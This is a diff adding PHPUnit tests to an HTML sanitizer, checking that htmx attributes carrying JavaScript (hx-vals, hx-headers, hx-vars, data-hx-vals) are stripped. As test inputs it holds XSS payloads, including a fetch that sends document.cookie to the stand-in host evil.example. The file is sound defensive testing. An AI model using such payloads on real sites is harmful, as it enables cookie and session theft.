@@ -72,6 +72,44 @@ final class PluginHtmlSanitizerTest extends TestCase
         $this->assertStringNotContainsString('alert(2)', $result);
     }
 
+    public function testHxValsIsRemovedEvenWithoutAJsPrefixBecauseItMatchesTheHxDenylist(): void
+    {
+        $html = '<div hx-get="/health" hx-trigger="load" '
+            .'hx-vals="js:fetch(\'https://evil.example/?c=\'+document.cookie)">content</div>';
+
+        $result = $this->sanitizer->sanitize($html);
+
+        $this->assertStringContainsString('hx-get="/health"', $result);
+        $this->assertStringContainsString('hx-trigger="load"', $result);
+        $this->assertStringNotContainsString('hx-vals', $result);
+        $this->assertStringNotContainsString('evil.example', $result);
+        $this->assertStringNotContainsString('document.cookie', $result);
+    }
+
+    public function testHxHeadersAndHxVarsAreAlsoRemoved(): void
+    {
+        $html = '<div hx-get="/health" hx-headers=\'js:{"X":document.cookie}\' hx-vars="js:alert(1)">content</div>';
+
+        $result = $this->sanitizer->sanitize($html);
+
+        $this->assertStringContainsString('hx-get="/health"', $result);
+        $this->assertStringNotContainsString('hx-headers', $result);
+        $this->assertStringNotContainsString('hx-vars', $result);
+        $this->assertStringNotContainsString('document.cookie', $result);
+        $this->assertStringNotContainsString('alert(1)', $result);
+    }
+
+    public function testDataHxValsAliasIsAlsoRemoved(): void
+    {
+        $html = '<div hx-get="/health" data-hx-vals="js:fetch(\'https://evil.example\')">content</div>';
+
+        $result = $this->sanitizer->sanitize($html);
+
+        $this->assertStringContainsString('hx-get="/health"', $result);
+        $this->assertStringNotContainsString('hx-vals', $result);
+        $this->assertStringNotContainsString('evil.example', $result);
+    }
+
     public function testJavascriptSchemeInHrefIsRemoved(): void
     {
         $result = $this->sanitizer->sanitize('<a href="javascript:alert(1)">Link</a>');
